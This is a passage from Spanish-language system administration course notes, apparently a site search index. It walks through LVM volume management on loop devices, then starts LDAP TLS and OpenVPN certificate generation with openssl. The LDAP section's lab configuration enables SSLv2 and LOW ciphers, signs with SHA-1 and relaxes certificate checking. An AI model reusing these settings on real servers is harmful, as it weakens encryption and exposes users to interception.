<nombre partici\u00f3n> <grupo VG a asignar> # Si quieres todo el espacio del disco sudo lvcreate -l <tama\u00f1o que quieres 100 %free> -n <nombre partici\u00f3n> <grupo VG a asignar> sudo mkfs.ext4 /dev/<grupo>/<partici\u00f3n> # formatear partici\u00f3n sudo mount /dev/<grupo>/<partici\u00f3n> /mnt # montar sudo vgextend <grupo> /dev/<disco> # a\u00f1adir PV a disco virtual sudo lvextend -L +<tama\u00f1o a aumentar M,G> /dev/<grupo>/<partici\u00f3n> # extender particion logica # Si queremos aumentar a todo el disco disponible sudo lvextend -l +100%free /dev/<grupo>/<partici\u00f3n> # aumentar el sistema de ficheros al completo de la partici\u00f3n sudo resize2fs /dev/<grupo>/<partici\u00f3n> # en modo ext4 sudo xfs_growfs /dev/<grupo>/<partici\u00f3n> # en modo xfs # reducir sudo e2fsck -f /dev/<grupo>/<partici\u00f3n> # reducir fs solo en ext algo 2,3,4 sudo resize2fs /dev/<grupo>/<partici\u00f3n> <tama\u00f1o a reducir ( 500M ) > # reducir fs sudo lvresize -L -<tama\u00f1o a quitar ( 500M ) > /dev/<grupo>/<partici\u00f3n> # reducir particion logica Entorno de Pruebas Se esta simulando dos discos f\u00edsicos, que se convertir\u00e1n en PV y estos formaran un disco virtua VG para jugar con las particiones LV. \u279c m06 dd if = /dev/zero of = disc1.img bs = 1k count = 100k \u279c m06 dd if = /dev/zero of = disc2.img bs = 1k count = 100k 104857600 bytes ( 105 MB, 100 MiB ) copied, 0 ,154778 s, 677 MB/s \u279c m06 sudo losetup /dev/loop0 disc1.img \u279c m06 sudo losetup /dev/loop1 disc2.img \u279c m06 sudo losetup -a /dev/loop1: [ 2054 ] :5249112 ( /var/tmp/m06/disc2.img ) /dev/loop0: [ 2054 ] :5248922 ( /var/tmp/m06/disc1.img ) Crear PV \u279c m06 sudo pvcreate /dev/loop0 Physical volume \"/dev/loop0\" successfully created. \u279c m06 sudo pvcreate /dev/loop1 Physical volume \"/dev/loop1\" successfully created. \u279c m06 sudo pvdisplay /dev/loop0 \"/dev/loop0\" is a new physical volume of \"100,00 MiB\" --- NEW Physical volume --- PV Name /dev/loop0 VG Name PV Size 100 ,00 MiB Allocatable NO PE Size 0 Total PE 0 Free PE 0 Allocated PE 0 PV UUID RqLfk2-OQIg-yH3z-flxD-wNVs-S9SE-omUu5G # display en formato reducido \u279c m06 sudo pvs /dev/loop0 PV VG Fmt Attr PSize PFree /dev/loop0 lvm2 --- 100 ,00m 100 ,00m Crear VG \u279c m06 sudo vgcreate diskedt /dev/loop0 /dev/loop1 Volume group \"diskedt\" successfully created \u279c m06 sudo vgdisplay diskedt --- Volume group --- VG Name diskedt System ID Format lvm2 Metadata Areas 2 Metadata Sequence No 1 VG Access read/write VG Status resizable MAX LV 0 Cur LV 0 Open LV 0 Max PV 0 Cur PV 2 Act PV 2 VG Size 192 ,00 MiB PE Size 4 ,00 MiB Total PE 48 Alloc PE / Size 0 / 0 Free PE / Size 48 / 192 ,00 MiB VG UUID wjjoFH-mOou-7wzb-leiN-ofVX-0Q65-Mw3PRp PE Unidad m\u00ednima de asignaci\u00f3n El PE es el tama\u00f1o en que divide los bloques del disco, por cada partici\u00f3n f\u00edsica o disco en este caso perdemos 4MiB que utiliza lvm para su gesti\u00f3n. Se puede ver como con 2 discos de 100MiB cada uno deber\u00eda obtener 200MiB y obtengo 192MiB, se pierde 4MiB por cada partici\u00f3n/disco real. Crear LV Al haberse dividido el disco virtual en bloques de 4MiB se podr\u00e1 crear particiones l\u00f3gicas con tama\u00f1o m\u00faltiple de 4, por ejemplo 148M o 152M, 150M no dejara, autom\u00e1ticamente se a\u00f1adir\u00e1 de 152M. \u279c m06 sudo lvcreate -L 50M -n sistema /dev/diskedt Rounding up size to full physical extent 52 ,00 MiB Logical volume \"sistema\" created. \u279c m06 sudo lvcreate -l 100 %FREE -n dades /dev/diskedt Logical volume \"dades\" created. \u279c m06 sudo lvdisplay /dev/diskedt/sistema --- Logical volume --- LV Path /dev/diskedt/sistema LV Name sistema VG Name diskedt LV UUID 84OwTh-abyU-SxTZ-1uGT-Qrp7-murD-7eTayk LV Write Access read/write LV Creation host, time pc02, 2020 -02-03 19 :26:09 +0100 LV Status available # open 0 LV Size 52 ,00 MiB Current LE 13 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 253 :0 Se puede ver como esta partici\u00f3n LV ocupa 52MiB y utiliza 13 bloques \"Current LE\" . -l 100%FREE especifica que el tama\u00f1o del lv sera el 100% del espacio disponible. Estructura Se puede ver como el VG diskedt contiene dos PV loop0 y loop1, y hay dos LV particiones l\u00f3gicas en diskedt, con la gracia que dades se a repartido autom\u00e1ticamente en 2 particiones f\u00edsicas. \u279c m06 sudo lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT loop0 7 :0 0 100M 0 loop \u251c\u2500diskedt-sistema 253 :0 0 52M 0 lvm \u2514\u2500diskedt-dades 253 :1 0 140M 0 lvm loop1 7 :1 0 100M 0 loop \u2514\u2500diskedt-dades 253 :1 0 140M 0 lvm \u279c m06 sudo lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert dades diskedt -wi-a----- 140 ,00m sistema diskedt -wi-a----- 52 ,00m El matiz es que el sistema ve un disco diskedt con 2 particiones sistema y dades , y lo que haya por debajo no le importa demasiado. Formatear particiones y montar \u279c m06 sudo mkfs.ext4 /dev/diskedt/dades \u279c m06 sudo mount /dev/diskedt/dades /mnt/dades \u279c m06 sudo df -h S.ficheros Tama\u00f1o Usados Disp Uso% Montado en ... /dev/mapper/diskedt-dades 132M 1 ,6M 121M 2 % /mnt/dades /dev/mapper/diskedt-sistema 47M 1 ,1M 42M 3 % /mnt/sistema A\u00f1adir disco Simulo que necesito mas espacio para el sistema y a\u00f1ado un disco f\u00edsico al pc, y lo a\u00f1ado al disco virtual diskedt. \u279c m06 dd if = /dev/zero of = disk3.img bs = 1k count = 100k \u279c m06 sudo losetup /dev/loop2 disc3.img \u279c m06 sudo pvcreate /dev/loop2 Physical volume \"/dev/loop2\" successfully created. # extender vg \u279c m06 sudo vgextend diskedt /dev/loop2 Volume group \"diskedt\" successfully extended \u279c m06 sudo vgs VG #PV #LV #SN Attr VSize VFree diskedt 3 2 0 wz--n- 288 ,00m 96 ,00m Podemos ver que ahora diskedt tiene 96MiB de espacio libre. Expandir partici\u00f3n Sumamos 30MiB a los 52MiB que tenia la particion LV sistema \u279c m06 sudo lvextend -L +30 /dev/diskedt/sistema /dev/loop2 Rounding size to boundary between physical extents: 32 ,00 MiB. Size of logical volume diskedt/sistema changed from 52 ,00 MiB ( 13 extents ) to 84 ,00 MiB \u279c m06 sudo lvdisplay /dev/diskedt/sistema --- Logical volume --- LV Path /dev/diskedt/sistema LV Name sistema VG Name diskedt LV UUID 84OwTh-abyU-SxTZ-1uGT-Qrp7-murD-7eTayk LV Write Access read/write LV Creation host, time pc02, 2020 -02-03 19 :26:09 +0100 LV Status available # open 1 LV Size 84 ,00 MiB Current LE 21 Segments 2 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 253 :0 Se puede ver que ahora ocupa 21 bloques, repartidos en 2 segmentos. \u279c m06 lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT loop0 7 :0 0 100M 0 loop \u251c\u2500diskedt-sistema 253 :0 0 84M 0 lvm /mnt/sistema \u2514\u2500diskedt-dades 253 :1 0 140M 0 lvm /mnt/dades loop1 7 :1 0 100M 0 loop \u2514\u2500diskedt-dades 253 :1 0 140M 0 lvm /mnt/dades loop2 7 :2 0 100M 0 loop \u2514\u2500diskedt-sistema 253 :0 0 84M 0 lvm /mnt/sistema Expandir sistema de archivos Estando montado se ve como expande sin problemas el sistema de ficheros \u279c m06 df -h S.ficheros Tama\u00f1o Usados Disp Uso% Montado en ... /dev/mapper/diskedt-dades 132M 1 ,6M 121M 2 % /mnt/dades /dev/mapper/diskedt-sistema 47M 1 ,1M 42M 3 % /mnt/sistema \u279c m06 sudo resize2fs /dev/diskedt/sistema \u279c m06 df -h S.ficheros Tama\u00f1o Usados Disp Uso% Montado en ... /dev/mapper/diskedt-dades 132M 1 ,6M 121M 2 % /mnt/dades /dev/mapper/diskedt-sistema 78M 1 ,6M 72M 3 % /mnt/sistema Reducir partici\u00f3n Para reducir una partici\u00f3n no es necesario desmontar, lvm ya se encarga del sistema de archivos el solo. \u279c m06 sudo lvreduce -L 50M -r /dev/diskedt/sistema \u279c m06 sudo lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert dades diskedt -wi-ao---- 140 ,00m sistema diskedt -wi-ao---- 52 ,00m Mover datos Para mover los datos de un disco a otro se utiliza pvmove pero antes de nada hay que realizar ciertos pasos. Simulo que e a\u00f1adido un disco grande y voy a prescindir de los 2 peque\u00f1os que tengo. # creo/inserto disco \u279c m06 dd if = /dev/zero of = disk3.img bs = 1k count = 500k 524288000 bytes ( 524 MB, 500 MiB ) copied, 0 ,705858 s, 743 MB/s \u279c m06 sudo losetup /dev/loop2 disk3.img # creo la marca de disco fisico \u279c m06 sudo pvcreate /dev/loop2 # lo a\u00f1ado al disco virtual \u279c m06 sudo vgextend diskedt /dev/loop2 # se puede ver que hay 3 pv y a crecido en tama\u00f1o \u279c m06 sudo vgs VG #PV #LV #SN Attr VSize VFree diskedt 3 2 0 wz-pn- 688 ,00m 496 ,00m # muevo datos al nuevo disco \u279c m06 sudo pvmove /dev/loop0 /dev/loop2 \u279c m06 sudo pvmove /dev/loop1 /dev/loop2 \u279c m06 lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT loop0 7 :0 0 100M 0 loop loop1 7 :1 0 100M 0 loop loop2 7 :2 0 500M 0 loop \u251c\u2500diskedt-sistema 253 :0 0 52M 0 lvm /mnt/sistema \u2514\u2500diskedt-dades 253 :1 0 140M 0 lvm /mnt/dades Todo esto con los datos montados, el usuario ni se entera de lo que pasa por debajo. Reducir disco Para extraer discos f\u00edsicos al disco virtual y por lo tanto reducir de tama\u00f1o. \u279c m06 sudo vgs VG #PV #LV #SN Attr VSize VFree diskedt 3 2 0 wz--n- 688 ,00m 496 ,00m \u279c m06 sudo vgreduce diskedt /dev/loop0 /dev/loop1 Removed \"/dev/loop0\" from volume group \"diskedt\" Removed \"/dev/loop1\" from volume group \"diskedt\" \u279c m06 sudo vgs VG #PV #LV #SN Attr VSize VFree diskedt 1 2 0 wz--n- 496 ,00m 304 ,00m Borrado Para borrar y desmontar todo, primero hay que desmontar y luego ir borrando desde arriba hacia abajo, LV, VG, PV. # desmontar \u279c m06 sudo umount /mnt/dades /mnt/sistema # borrado lv \u279c m06 sudo lvremove /dev/diskedt/sistema /dev/diskedt/dades # borrado vg \u279c m06 sudo vgremove diskedt # borrado pv \u279c m06 sudo pvremove /dev/loop { 0 ..2 }","title":"Lvm logical volum manager"},{"location":"seguridad/lvm/#lvm-logical-volum-manager","text":"Con LVM podemos re-dimensionar espacios, a\u00f1adir o quitar discos estando en caliente. De las particiones f\u00edsicas reales se crean discos virtuales, y de esos virtuales creas las particiones a utilizar. PV : phisical volume Se refiere a particiones en un disco real. VG : volum group Discos virtuales que crea lvm partiendo de x numero de particiones PV. LV : logical volum Particiones del disco virtual de las que montaremos nuestros datos.","title":"Lvm logical volum manager"},{"location":"seguridad/lvm/#ordenes","text":"# display lsblk # para ver nuestros discos sudo pvs # ver volumens fisicos sudo pvdisplay sudo vgs # ver discos virtuales sudo vgdisplay sudo lvs # ver particiones logicas sudo lvdisplay # accion sudo pvcreate /dev/<disco> # crear volumen fisico sudo vgcreate <nombre de grupo> /dev/<disco>... # crear disco virtual # crear particion logica sudo lvcreate -L +<tama\u00f1o que quieres 200M> -n <nombre partici\u00f3n> <grupo VG a asignar> # Si quieres todo el espacio del disco sudo lvcreate -l <tama\u00f1o que quieres 100 %free> -n <nombre partici\u00f3n> <grupo VG a asignar> sudo mkfs.ext4 /dev/<grupo>/<partici\u00f3n> # formatear partici\u00f3n sudo mount /dev/<grupo>/<partici\u00f3n> /mnt # montar sudo vgextend <grupo> /dev/<disco> # a\u00f1adir PV a disco virtual sudo lvextend -L +<tama\u00f1o a aumentar M,G> /dev/<grupo>/<partici\u00f3n> # extender particion logica # Si queremos aumentar a todo el disco disponible sudo lvextend -l +100%free /dev/<grupo>/<partici\u00f3n> # aumentar el sistema de ficheros al completo de la partici\u00f3n sudo resize2fs /dev/<grupo>/<partici\u00f3n> # en modo ext4 sudo xfs_growfs /dev/<grupo>/<partici\u00f3n> # en modo xfs # reducir sudo e2fsck -f /dev/<grupo>/<partici\u00f3n> # reducir fs solo en ext algo 2,3,4 sudo resize2fs /dev/<grupo>/<partici\u00f3n> <tama\u00f1o a reducir ( 500M ) > # reducir fs sudo lvresize -L -<tama\u00f1o a quitar ( 500M ) > /dev/<grupo>/<partici\u00f3n> # reducir particion logica","title":"Ordenes"},{"location":"seguridad/lvm/#entorno-de-pruebas","text":"Se esta simulando dos discos f\u00edsicos, que se convertir\u00e1n en PV y estos formaran un disco virtua VG para jugar con las particiones LV. \u279c m06 dd if = /dev/zero of = disc1.img bs = 1k count = 100k \u279c m06 dd if = /dev/zero of = disc2.img bs = 1k count = 100k 104857600 bytes ( 105 MB, 100 MiB ) copied, 0 ,154778 s, 677 MB/s \u279c m06 sudo losetup /dev/loop0 disc1.img \u279c m06 sudo losetup /dev/loop1 disc2.img \u279c m06 sudo losetup -a /dev/loop1: [ 2054 ] :5249112 ( /var/tmp/m06/disc2.img ) /dev/loop0: [ 2054 ] :5248922 ( /var/tmp/m06/disc1.img )","title":"Entorno de Pruebas"},{"location":"seguridad/lvm/#crear-pv","text":"\u279c m06 sudo pvcreate /dev/loop0 Physical volume \"/dev/loop0\" successfully created. \u279c m06 sudo pvcreate /dev/loop1 Physical volume \"/dev/loop1\" successfully created. \u279c m06 sudo pvdisplay /dev/loop0 \"/dev/loop0\" is a new physical volume of \"100,00 MiB\" --- NEW Physical volume --- PV Name /dev/loop0 VG Name PV Size 100 ,00 MiB Allocatable NO PE Size 0 Total PE 0 Free PE 0 Allocated PE 0 PV UUID RqLfk2-OQIg-yH3z-flxD-wNVs-S9SE-omUu5G # display en formato reducido \u279c m06 sudo pvs /dev/loop0 PV VG Fmt Attr PSize PFree /dev/loop0 lvm2 --- 100 ,00m 100 ,00m","title":"Crear PV"},{"location":"seguridad/lvm/#crear-vg","text":"\u279c m06 sudo vgcreate diskedt /dev/loop0 /dev/loop1 Volume group \"diskedt\" successfully created \u279c m06 sudo vgdisplay diskedt --- Volume group --- VG Name diskedt System ID Format lvm2 Metadata Areas 2 Metadata Sequence No 1 VG Access read/write VG Status resizable MAX LV 0 Cur LV 0 Open LV 0 Max PV 0 Cur PV 2 Act PV 2 VG Size 192 ,00 MiB PE Size 4 ,00 MiB Total PE 48 Alloc PE / Size 0 / 0 Free PE / Size 48 / 192 ,00 MiB VG UUID wjjoFH-mOou-7wzb-leiN-ofVX-0Q65-Mw3PRp","title":"Crear VG"},{"location":"seguridad/lvm/#pe-unidad-minima-de-asignacion","text":"El PE es el tama\u00f1o en que divide los bloques del disco, por cada partici\u00f3n f\u00edsica o disco en este caso perdemos 4MiB que utiliza lvm para su gesti\u00f3n. Se puede ver como con 2 discos de 100MiB cada uno deber\u00eda obtener 200MiB y obtengo 192MiB, se pierde 4MiB por cada partici\u00f3n/disco real.","title":"PE Unidad m\u00ednima de asignaci\u00f3n"},{"location":"seguridad/lvm/#crear-lv","text":"Al haberse dividido el disco virtual en bloques de 4MiB se podr\u00e1 crear particiones l\u00f3gicas con tama\u00f1o m\u00faltiple de 4, por ejemplo 148M o 152M, 150M no dejara, autom\u00e1ticamente se a\u00f1adir\u00e1 de 152M. \u279c m06 sudo lvcreate -L 50M -n sistema /dev/diskedt Rounding up size to full physical extent 52 ,00 MiB Logical volume \"sistema\" created. \u279c m06 sudo lvcreate -l 100 %FREE -n dades /dev/diskedt Logical volume \"dades\" created. \u279c m06 sudo lvdisplay /dev/diskedt/sistema --- Logical volume --- LV Path /dev/diskedt/sistema LV Name sistema VG Name diskedt LV UUID 84OwTh-abyU-SxTZ-1uGT-Qrp7-murD-7eTayk LV Write Access read/write LV Creation host, time pc02, 2020 -02-03 19 :26:09 +0100 LV Status available # open 0 LV Size 52 ,00 MiB Current LE 13 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 253 :0 Se puede ver como esta partici\u00f3n LV ocupa 52MiB y utiliza 13 bloques \"Current LE\" . -l 100%FREE especifica que el tama\u00f1o del lv sera el 100% del espacio disponible.","title":"Crear LV"},{"location":"seguridad/lvm/#estructura","text":"Se puede ver como el VG diskedt contiene dos PV loop0 y loop1, y hay dos LV particiones l\u00f3gicas en diskedt, con la gracia que dades se a repartido autom\u00e1ticamente en 2 particiones f\u00edsicas. \u279c m06 sudo lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT loop0 7 :0 0 100M 0 loop \u251c\u2500diskedt-sistema 253 :0 0 52M 0 lvm \u2514\u2500diskedt-dades 253 :1 0 140M 0 lvm loop1 7 :1 0 100M 0 loop \u2514\u2500diskedt-dades 253 :1 0 140M 0 lvm \u279c m06 sudo lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert dades diskedt -wi-a----- 140 ,00m sistema diskedt -wi-a----- 52 ,00m El matiz es que el sistema ve un disco diskedt con 2 particiones sistema y dades , y lo que haya por debajo no le importa demasiado.","title":"Estructura"},{"location":"seguridad/lvm/#formatear-particiones-y-montar","text":"\u279c m06 sudo mkfs.ext4 /dev/diskedt/dades \u279c m06 sudo mount /dev/diskedt/dades /mnt/dades \u279c m06 sudo df -h S.ficheros Tama\u00f1o Usados Disp Uso% Montado en ... /dev/mapper/diskedt-dades 132M 1 ,6M 121M 2 % /mnt/dades /dev/mapper/diskedt-sistema 47M 1 ,1M 42M 3 % /mnt/sistema","title":"Formatear particiones y montar"},{"location":"seguridad/lvm/#anadir-disco","text":"Simulo que necesito mas espacio para el sistema y a\u00f1ado un disco f\u00edsico al pc, y lo a\u00f1ado al disco virtual diskedt. \u279c m06 dd if = /dev/zero of = disk3.img bs = 1k count = 100k \u279c m06 sudo losetup /dev/loop2 disc3.img \u279c m06 sudo pvcreate /dev/loop2 Physical volume \"/dev/loop2\" successfully created. # extender vg \u279c m06 sudo vgextend diskedt /dev/loop2 Volume group \"diskedt\" successfully extended \u279c m06 sudo vgs VG #PV #LV #SN Attr VSize VFree diskedt 3 2 0 wz--n- 288 ,00m 96 ,00m Podemos ver que ahora diskedt tiene 96MiB de espacio libre.","title":"A\u00f1adir disco"},{"location":"seguridad/lvm/#expandir-particion","text":"Sumamos 30MiB a los 52MiB que tenia la particion LV sistema \u279c m06 sudo lvextend -L +30 /dev/diskedt/sistema /dev/loop2 Rounding size to boundary between physical extents: 32 ,00 MiB. Size of logical volume diskedt/sistema changed from 52 ,00 MiB ( 13 extents ) to 84 ,00 MiB \u279c m06 sudo lvdisplay /dev/diskedt/sistema --- Logical volume --- LV Path /dev/diskedt/sistema LV Name sistema VG Name diskedt LV UUID 84OwTh-abyU-SxTZ-1uGT-Qrp7-murD-7eTayk LV Write Access read/write LV Creation host, time pc02, 2020 -02-03 19 :26:09 +0100 LV Status available # open 1 LV Size 84 ,00 MiB Current LE 21 Segments 2 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 253 :0 Se puede ver que ahora ocupa 21 bloques, repartidos en 2 segmentos. \u279c m06 lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT loop0 7 :0 0 100M 0 loop \u251c\u2500diskedt-sistema 253 :0 0 84M 0 lvm /mnt/sistema \u2514\u2500diskedt-dades 253 :1 0 140M 0 lvm /mnt/dades loop1 7 :1 0 100M 0 loop \u2514\u2500diskedt-dades 253 :1 0 140M 0 lvm /mnt/dades loop2 7 :2 0 100M 0 loop \u2514\u2500diskedt-sistema 253 :0 0 84M 0 lvm /mnt/sistema","title":"Expandir partici\u00f3n"},{"location":"seguridad/lvm/#expandir-sistema-de-archivos","text":"Estando montado se ve como expande sin problemas el sistema de ficheros \u279c m06 df -h S.ficheros Tama\u00f1o Usados Disp Uso% Montado en ... /dev/mapper/diskedt-dades 132M 1 ,6M 121M 2 % /mnt/dades /dev/mapper/diskedt-sistema 47M 1 ,1M 42M 3 % /mnt/sistema \u279c m06 sudo resize2fs /dev/diskedt/sistema \u279c m06 df -h S.ficheros Tama\u00f1o Usados Disp Uso% Montado en ... /dev/mapper/diskedt-dades 132M 1 ,6M 121M 2 % /mnt/dades /dev/mapper/diskedt-sistema 78M 1 ,6M 72M 3 % /mnt/sistema","title":"Expandir sistema de archivos"},{"location":"seguridad/lvm/#reducir-particion","text":"Para reducir una partici\u00f3n no es necesario desmontar, lvm ya se encarga del sistema de archivos el solo. \u279c m06 sudo lvreduce -L 50M -r /dev/diskedt/sistema \u279c m06 sudo lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert dades diskedt -wi-ao---- 140 ,00m sistema diskedt -wi-ao---- 52 ,00m","title":"Reducir partici\u00f3n"},{"location":"seguridad/lvm/#mover-datos","text":"Para mover los datos de un disco a otro se utiliza pvmove pero antes de nada hay que realizar ciertos pasos. Simulo que e a\u00f1adido un disco grande y voy a prescindir de los 2 peque\u00f1os que tengo. # creo/inserto disco \u279c m06 dd if = /dev/zero of = disk3.img bs = 1k count = 500k 524288000 bytes ( 524 MB, 500 MiB ) copied, 0 ,705858 s, 743 MB/s \u279c m06 sudo losetup /dev/loop2 disk3.img # creo la marca de disco fisico \u279c m06 sudo pvcreate /dev/loop2 # lo a\u00f1ado al disco virtual \u279c m06 sudo vgextend diskedt /dev/loop2 # se puede ver que hay 3 pv y a crecido en tama\u00f1o \u279c m06 sudo vgs VG #PV #LV #SN Attr VSize VFree diskedt 3 2 0 wz-pn- 688 ,00m 496 ,00m # muevo datos al nuevo disco \u279c m06 sudo pvmove /dev/loop0 /dev/loop2 \u279c m06 sudo pvmove /dev/loop1 /dev/loop2 \u279c m06 lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT loop0 7 :0 0 100M 0 loop loop1 7 :1 0 100M 0 loop loop2 7 :2 0 500M 0 loop \u251c\u2500diskedt-sistema 253 :0 0 52M 0 lvm /mnt/sistema \u2514\u2500diskedt-dades 253 :1 0 140M 0 lvm /mnt/dades Todo esto con los datos montados, el usuario ni se entera de lo que pasa por debajo.","title":"Mover datos"},{"location":"seguridad/lvm/#reducir-disco","text":"Para extraer discos f\u00edsicos al disco virtual y por lo tanto reducir de tama\u00f1o. \u279c m06 sudo vgs VG #PV #LV #SN Attr VSize VFree diskedt 3 2 0 wz--n- 688 ,00m 496 ,00m \u279c m06 sudo vgreduce diskedt /dev/loop0 /dev/loop1 Removed \"/dev/loop0\" from volume group \"diskedt\" Removed \"/dev/loop1\" from volume group \"diskedt\" \u279c m06 sudo vgs VG #PV #LV #SN Attr VSize VFree diskedt 1 2 0 wz--n- 496 ,00m 304 ,00m","title":"Reducir disco"},{"location":"seguridad/lvm/#borrado","text":"Para borrar y desmontar todo, primero hay que desmontar y luego ir borrando desde arriba hacia abajo, LV, VG, PV. # desmontar \u279c m06 sudo umount /mnt/dades /mnt/sistema # borrado lv \u279c m06 sudo lvremove /dev/diskedt/sistema /dev/diskedt/dades # borrado vg \u279c m06 sudo vgremove diskedt # borrado pv \u279c m06 sudo pvremove /dev/loop { 0 ..2 }","title":"Borrado"},{"location":"seguridad/practica-ssl-tls/","text":"Ldap tls Ldap con conexiones seguras TLS/SSL y startTLS. Generar certificados # genrar llaves privadas, del servidor. openssl genrsa -out cakey.pem 2048 openssl genrsa -out serverkey.pem 2048 # genrar certificado propio de la entidad CA por 365 dias openssl req -new -x509 -nodes -sha1 -days 365 -key cakey.pem -out cacrt.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :Varitat Absoluta Organizational Unit Name ( eg, section ) [] :Dep de certificats Common Name ( e.g. server FQDN or YOUR name ) [] :VeritatAbsoluta Email Address [] :admin@edt.org # generar una de certificado request para enviar a la entidad certificadora CA openssl req -new -key serverkey.pem -out servercsr.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :escola de mi casa Organizational Unit Name ( eg, section ) [] :dep informatica Common Name ( e.g. server FQDN or YOUR name ) [] :ldap.edt.org Email Address [] :admin@edt.org Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt # Una entidad CA a de firmar el servercsr.pem y devolvernos un certificado.crt, como hago yo mismo de entidad cat ca.conf basicConstraints = critical,CA:FALSE extendedKeyUsage = serverAuth,emailProtection # Autoridad CA firmando el certificado openssl x509 -CA cacrt.pem -CAkey cakey.pem -req -in servercsr.pem -days 365 -sha1 -extfile ca.conf -CAcreateserial -out servercrt.pem Signature ok subject = C = ca, ST = Barcelona, L = Barcelona, O = escola de mi casa, OU = dep informatica, CN = ldap.edt.org, emailAddress = admin@edt.org Getting CA Private Key # archivos finales \u279c ll total 60K -rw-r--r-- 1 debian debian 83 abr 1 10 :14 ca.conf -rw-r--r-- 1 debian debian 1 ,5K abr 1 10 :23 cacrt.pem -rw-r--r-- 1 debian debian 41 abr 1 10 :35 cacrt.srl -rw------- 1 debian debian 1 ,7K abr 1 10 :14 cakey.pem -rw-r--r-- 1 debian debian 1 ,5K abr 1 10 :35 servercrt.pem -rw-r--r-- 1 debian debian 1 ,2K abr 1 10 :32 servercsr.pem -rw------- 1 debian debian 1 ,7K abr 1 10 :14 serverkey.pem Configuraci\u00f3n slapd.conf --- TLSCACertificateFile /etc/openldap/certs/cacrt.pem TLSCertificateFile /etc/openldap/certs/servercrt.pem TLSCertificateKeyFile /etc/openldap/certs/serverkey.pem TLSVerifyClient never TLSCipherSuite HIGH:MEDIUM:LOW:+SSLv2 --- ldap.conf --- TLS_CACERT /etc/openldap/certs/cacrt.pem SASL_NOCANON on URI ldap://ldap.edt.org BASE dc = edt,dc = org --- startup.sh --- /sbin/slapd -d0 -h \"ldap:/// ldaps:/// ldapi:///\" --- cliente ldap.conf TLS_CACERT /etc/ldap/cacrt.pem TLS_REQCERT allow URI ldap://ldap.edt.org BASE dc = edt,dc = org SASL_NOCANON on Comprobaciones ldapsearch -x -LLL -ZZ dn ldapsearch -x -LLL -ZZ -h ldap.edt.org -b 'dc=edt,dc=org' dn ldapsearch -x -LLL -H ldaps://ldap.edt.org dn openssl s_client -connect ldap.edt.org:636 Docker \u279c docker run --rm --name ldap.edt.org -h ldap.edt.org -p 389 :389 -p 636 :636 -d jorgepastorr/ldapserver19:tls OpenVpn Generar llaves servidor Primero creamos nuestra CA \u279c openssl genrsa -des3 -out cakey.pem 2048 \u279c openssl req -new -x509 -nodes -sha1 -days 365 -key cakey.pem -out cacert.pem Enter pass phrase for cakey.pem: You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :Veritat absoluta Organizational Unit Name ( eg, section ) [] :Departament de certificats Common Name ( e.g. server FQDN or YOUR name ) [] :VeritatAbsoluta Email Address [] :admin@edt.org \u279c ll -rw-r--r-- 1 debian debian 1 ,5K mar 30 11 :24 cacert.pem -rw------- 1 debian debian 1 ,8K mar 30 11 :17 cakey.pem generar la llave del servidor y el request para enviar a la CA para que nos certifique. \u279c openssl dhparam -out dh2048.pem 2048 # llave del server \u279c openssl genrsa -out serverkey.pem 2048 Generating RSA private key, 2048 bit long modulus ( 2 primes ) .........................................+++++ ................................................................+++++ e is 65537 ( 0x010001 ) # request para la CA \u279c openssl req -new -key serverkey.pem -out serverreq.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :barcelona Locality Name ( eg, city ) [] :barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :server vvpn Organizational Unit Name ( eg, section ) [] :VpnServer Common Name ( e.g. server FQDN or YOUR name ) [] :VpnServer Email Address [] : Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt Como no tenemos CA externa, simulamos una y nos auto certificamos. fichero de extensiones para servidor: basicConstraints = CA:FALSE nsCertType = server nsComment = \"OpenSSL Generated Server Certificate\" subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always extendedKeyUsage = serverAuth keyUsage = digitalSignature, keyEncipherment Generar certificado ( esto lo deber\u00eda hacer una certificadora externa a nosotros ) \u279c openssl x509 -CAkey cakey.pem -CA cacert.pem -req -in serverreq.pem -days 365 -CAcreateserial -extfile ext.server.conf -out servercert.pem Signature ok subject = C = ca, ST = 